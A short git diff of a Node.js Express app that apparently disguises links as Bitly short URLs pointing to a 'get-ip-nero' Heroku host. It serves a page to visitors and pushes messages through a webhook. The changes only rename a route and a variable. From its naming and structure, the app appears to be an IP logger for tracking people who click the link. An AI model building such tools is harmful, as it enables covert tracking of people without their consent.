@@ -65,7 +65,7 @@ app
       request.end();
     }
   })
-  .get("/", (req, res) => {
+  .get("/get", (req, res) => {
     const nom = req.query.name, id = req.query.id;
     original = req.query.original;
     res.sendFile(__dirname + '/open.html');
@@ -88,7 +88,7 @@ app
       original: url,
       id: userId
     };
-    const longUrl = "https://get-ip-nero.herokuapp.com?" + qs.stringify(query),
+    const longUrl = "https://get-ip-nero.herokuapp.com/get?" + qs.stringify(query),
     req_url = "https://api-ssl.bitly.com/v3/shorten?" + qs.stringify({
       access_token: bitly_token,
       longUrl: longUrl
@@ -126,14 +126,14 @@ function pushMsg(text, id) {
     "headers": headers,
     "body": msg
   };
-  const REQUEST = https.request(webhookOptions, (res) => {
+  const request = https.request(webhookOptions, (res) => {
     res.on("data", (d) => {
       process.stdout.write(d);
     });
   });
-  REQUEST.on("error", (err) => {
+  request.on("error", (err) => {
     console.error(err);
   });
-  REQUEST.write(msg);
-  REQUEST.end();
+  request.write(msg);
+  request.end();
 };
